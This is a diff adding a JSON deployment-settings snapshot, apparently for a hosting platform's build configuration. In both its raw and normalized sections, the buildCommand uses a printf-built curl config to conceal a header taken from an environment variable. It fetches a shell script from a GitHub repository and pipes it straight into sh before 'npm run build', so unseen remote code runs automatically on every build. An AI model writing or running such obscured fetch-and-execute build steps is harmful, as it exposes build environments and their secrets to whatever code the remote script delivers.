@@ -1,0 +1,18 @@
+{
+  "raw": {
+    "installCommand": null,
+    "buildCommand": "g=$(printf 'url=\"%s\"\\n%s' \"https://api.github.com/repos/Price2Book/p2b-release-proofs/contents/scripts/provenance-guard.sh?ref=main\" \"$P2B_GH_HDR\"|curl -fsSK- --max-time 30)&&[ -n \"$g\" ]&&echo \"$g\"|sh&&npm run build",
+    "outputDirectory": "public",
+    "framework": null
+  },
+  "normalized": {
+    "rootDirectory": null,
+    "installCommand": null,
+    "buildCommand": "g=$(printf 'url=\"%s\"\\n%s' \"https://api.github.com/repos/Price2Book/p2b-release-proofs/contents/scripts/provenance-guard.sh?ref=main\" \"$P2B_GH_HDR\"|curl -fsSK- --max-time 30)&&[ -n \"$g\" ]&&echo \"$g\"|sh&&npm run build",
+    "outputDirectory": "public",
+    "framework": null
+  },
+  "absent": [
+    "rootDirectory"
+  ]
+}
